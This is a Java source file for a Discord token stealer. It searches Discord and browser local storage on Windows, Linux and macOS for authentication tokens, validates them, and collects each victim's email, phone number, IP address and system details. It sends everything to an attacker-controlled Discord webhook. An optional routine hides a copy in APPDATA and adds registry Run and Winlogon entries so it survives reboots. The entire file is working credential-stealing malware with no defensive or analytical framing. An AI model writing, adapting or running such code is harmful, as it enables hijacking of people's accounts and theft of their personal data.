package com.healer;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static boolean debug = true; // Whether or not everyting should be displayed on terminal window

    public static void main(String[] args) throws Exception {

        String s = null;
        StringBuilder configFileString = new StringBuilder();
        InputStream in = Main.class.getResourceAsStream("webhook.txt");
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        while ((s = reader.readLine()) != null) {
            configFileString.append(s).append("\n");
        }

        //Settings:
        String hideAs = getJsonKey(configFileString.toString(), "hide_As"); //What the registry entry should be called.
        String discord_avatar_url = getJsonKey(configFileString.toString(), "discord_avatar_url"); //If you want to change the webhook icon
        String discord_username = getJsonKey(configFileString.toString(), "discord_username"); //Webhook Name (only when embed)
        String discord_webhook_url = getJsonKey(configFileString.toString(), "discord_webhook_url"); // args[0]; //Change this
        boolean send_embed = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "send_embed")); //True sends embed, False sends it in text
        boolean ensure_valid = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "ensure_valid")); //Checks the account before sending (removes if invalid)
        boolean randomize_new_name = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "randomize_new_name")); //Whether or not a random string shoud be set as the file name
        boolean shouldPersist = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "shouldPersist"));

        if (!(args.length > 0)) {
            if (System.getProperty("os.name").contains("Windows")) {
                String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
                String decodedPath = URLDecoder.decode(path, "UTF-8");
                String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];

                //Mini
                if (shouldPersist) {
                    miniPersistence(randomize_new_name, hideAs);
                }

                //Gatherer
                for (String token : getTokens(ensure_valid)) {
                    sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
                }

            } else {
            }
        }





        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    }

    private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
        //Account Information
        String accountInfo_username;

        String accountInfo_email;
        String accountInfo_phoneNr;
        boolean accountInfo_hasNitro; //https://discord.com/api/v8/users/@me/billing/subscriptions
        boolean accountInfo_hasBillingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
        String accountInfo_imageURL;

        //PC Info
        String pcInfo_IP;
        String pcInfo_Username;
        String pcInfo_cpuArch;
        String pcInfo_WindowsVersion;

        //Assign what we know
        pcInfo_Username = System.getProperty("user.name");
        pcInfo_WindowsVersion = System.getProperty("os.name");
        pcInfo_cpuArch = System.getProperty("os.arch");

        //Get IP
        pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);

        //Get discord token
        String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
        accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
        accountInfo_hasNitro = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
        accountInfo_hasBillingInfo = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
        accountInfo_email = getJsonKey(tokenInformation, "email");

        accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+getJsonKey(tokenInformation, "id")+"/"+getJsonKey(tokenInformation, "avatar")+".png";



        String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/77381104?v=4\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: Coming Soon\\nBilling Info: Coming Soon\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
        String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```"+accountInfo_hasNitro+"```\\n**Billing Info:**\\n```"+accountInfo_hasBillingInfo+"```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";

        if (sendEmbed) {
            if (debug) {
                System.out.println(finishedEmbedContent);
            }
            return finishedEmbedContent;
        } else {
            if (debug) {
                System.out.println(finishedTextContent);
            }

            return finishedTextContent;
        }
    }



    private static List<String> getTokens(boolean check_isValid) {
        List<String> tokens = new ArrayList<>();
        String fs = System.getenv("file.separator");
        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
                {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
                {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
                {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
                {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, //Opera Browser Linux
                {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, //Discord Linux
                {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
        };

        for (String[] path : paths) {
            try {
                File file = new File(path[1]);

                for (String pathname : file.list()) {
                    if (debug) {
                        System.out.println("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
                    }
                    FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                            if (debug) {
                                System.out.println("Found token: " + m.group() + " in " + pathname);
                                System.out.println("isDuplicate: " + tokens.contains(m.group()));
                            }
                            if (!tokens.contains(m.group())) {
                                tokens.add(m.group());
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        if (check_isValid) {
            if (debug) {
                System.out.println("checking if valid");
                System.out.println(tokens.toString());
            }
            if (!tokens.isEmpty()) {
                Iterator<String> iter = tokens.iterator();

                while (iter.hasNext()) {
                    String str = iter.next();
                    try {
                        get_request("https://discordapp.com/api/v6/users/@me", true, str);
                        if (debug) {
                            System.out.println("Token: " + str + " is valid");
                        }

                    } catch (IOException e) {
                        if (debug) {
                            System.out.println("Removing token " + str + "            " + e.getMessage());
                        }
                        iter.remove();
                    }
                }

                return tokens;
            } else {
                if (debug) {
                    System.out.println("No tokens found\nExitting...");
                    System.exit(0);
                }
                return null;
            }


        } else {
            return tokens;
        }
    }



    /////////////////
    /// Requests ///
    ////////////////

    private static String get_request(String uri, boolean isChecking, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        if (isChecking) {
            connection.setRequestProperty("Authorization", token);
        }
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();
        if (debug) {
            System.out.println("GET - "+connection.getResponseCode());
        }
        try (Scanner scanner = new Scanner(responseStream)) {
            String responseBody = scanner.useDelimiter("\\A").next();
            if (debug) {
                System.out.println(responseBody);
            }
            return responseBody;
        } catch (Exception e) {
            return "ERROR";
        }
    }

    private static void sendEmbed(String jsonContent, String webhookURL) throws IOException {
        URL url = new URL(webhookURL);
        URLConnection con = url.openConnection();
        HttpURLConnection connection = (HttpURLConnection)con;
        connection.setRequestMethod("POST"); // PUT is another valid option
        connection.setDoOutput(true);

        byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
        int length = out.length;

        connection.setFixedLengthStreamingMode(length);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        connection.connect();
        try(OutputStream os = connection.getOutputStream()) {
            os.write(out);
        }
        if (debug) {
            System.out.println("POST - "+connection.getResponseCode());
        }

    }

    private static void miniPersistence(boolean randomize_new_name, String hideAs) throws Exception {
        String new_name;
        String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        String decodedPath = URLDecoder.decode(path, "UTF-8");
        String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
        if (randomize_new_name) {
            new_name = UUID.randomUUID().toString().substring(16) + ".jar";
        } else {
            new_name = hideAs;
            if (!new_name.contains(".jar")) {
                new_name = new_name + ".jar";
            }

        }


        if (file_name.contains(".jar")) {
            //Make sure there is a file in roaming that does what we do
            try {
                try (OutputStream out = new FileOutputStream(new File(System.getenv("APPDATA"), new_name))) {
                    Files.copy(new File(System.getProperty("user.dir"), file_name).toPath(), out);
                    out.flush();
                } catch (IOException i) {
                }

            } catch (ArrayIndexOutOfBoundsException e) {
                copyFileTo(new File(System.getProperty("user.dir"), file_name), new File(System.getenv("APPDATA"), new_name));
            }

            if (new File(System.getenv("APPDATA"), new_name).exists()) {
                //Copy file to startup
                //String startup_path = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup";
                //copyFileTo(new File(System.getenv("APPDATA"), new_name), new File(startup_path));
                String batch_file = new_name + ".bat";
                writeToFile(new File("@echo off & java -jar " + batch_file + " & exit"), "@echo off & java -jar " + new_name + " & exit");

                String[] reg_start = {
                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                };
                Process proc = Runtime.getRuntime().exec(reg_start[0]);
                proc.destroy();
                for (int i = 1; i < reg_start.length; i++) {
                    final boolean[] done = new boolean[1];
                    int finalI = i;
                    Thread thread = new Thread() {
                        public void run() {
                            if (debug) {
                                System.out.println("Executing command: " + reg_start[finalI]);
                            }
                            try {
                                Process proc = Runtime.getRuntime().exec(reg_start[finalI]);

                                BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                                String s = null;
                                while ((s = stdInput.readLine()) != null) {
                                    if (s.equalsIgnoreCase("The operation completed successfully.")) {
                                        System.out.println("Successfulyy added to registry");
                                        proc.destroy();
                                        done[0] = true;
                                    }
                                }

                                if (proc.isAlive()) {
                                    System.out.println("Failed to add to registry");
                                    proc.destroy();
                                }
                            } catch (Exception e) {
                                if (debug) {
                                    System.out.println(e.getMessage());
                                }
                            }
                        }
                    };
                    thread.start();
                    if (done[0]) {
                        thread.stop();
                    }


                }
            }

            if (new File(file_name).exists()) {
                if (new File(file_name).delete()) {
                    System.exit(1);
                }
            }
        }
    }

    private static void writeToFile(File file, String text) throws IOException {
        Files.write(file.toPath(), Collections.singleton(text));
    }

    private static boolean copyFileTo(File f1, File f2) throws IOException {
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new FileInputStream(f1);
            os = new FileOutputStream(f2);
            byte[] buffer = new byte[1024];
            int length;
            long finalLength = 0;
            while ((length = is.read(buffer)) > 0) {
                os.write(buffer, 0, length);
                finalLength = finalLength + length;
                if (debug) {
                    System.out.println("Moving " + length + "bytes to " + f2.getPath() + " | " + finalLength);
                }

            }
        } finally {
            if(is!=null&&os!=null){
                is.close();
                os.close();
            }

        }

        return f2.exists();
    }

    private static String getJsonKey(String jsonString, String wantedKey) {
        Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
        Matcher matcher = jsonPattern.matcher(jsonString);

        if (matcher.find()) {
            return matcher.group(0).split("\"")[3];
        }
        return null;
    }

}